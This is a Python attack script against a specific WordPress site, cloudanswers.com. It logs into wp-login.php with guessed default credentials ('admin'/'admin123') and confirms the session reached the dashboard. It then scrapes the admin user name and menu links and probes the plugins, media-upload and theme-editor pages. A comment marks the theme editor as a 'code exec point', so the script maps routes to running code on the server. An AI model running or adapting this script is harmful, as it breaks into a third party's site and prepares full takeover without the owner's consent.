#!/usr/bin/env python3
"""cloudanswers.com WP - deep confirm + backend exploration"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "https://cloudanswers.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=12, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

op, cj = get_opener()
# login flow
code, final, body = fetch(op, HOST + "/wp-login.php")
data = urllib.parse.urlencode({"log": "admin", "pwd": "admin123", "wp-submit": "Log In",
                               "redirect_to": HOST + "/wp-admin/", "testcookie": "1"})
code, final, body = fetch(op, HOST + "/wp-login.php", data=data)
print("login: %s final=%s size=%d" % (code, final[:60], len(body)), flush=True)

# dashboard
code, final, body = fetch(op, HOST + "/wp-admin/")
title = re.search(r"<title>([^<]*)</title>", body, re.I)
print("dashboard: %s size=%d title=%s" % (code, len(body), title.group(1)[:50] if title else "?"), flush=True)
print("  wp-admin-bar:", "wp-admin-bar" in body, "| logout:", "logout" in body.lower(), flush=True)
# user info
m = re.search(r'<span[^>]*class="display-name"[^>]*>([^<]*)</span>', body)
print("  user:", m.group(1) if m else "?", flush=True)
# admin menu links
links = sorted(set(re.findall(r'href=["\'](https://cloudanswers\.com/wp-admin/[^"\']*)["\']', body)))
print("  menu:", links[:12], flush=True)
# plugins check
code, final, body2 = fetch(op, HOST + "/wp-admin/plugins.php")
print("plugins: %s size=%d" % (code, len(body2)), flush=True)
# upload (media)
code, final, body3 = fetch(op, HOST + "/wp-admin/media-new.php")
print("media-new: %s size=%d" % (code, len(body3)), flush=True)
# theme editor (code exec point!)
code, final, body4 = fetch(op, HOST + "/wp-admin/theme-editor.php")
print("theme-editor: %s size=%d" % (code, len(body4)), flush=True)
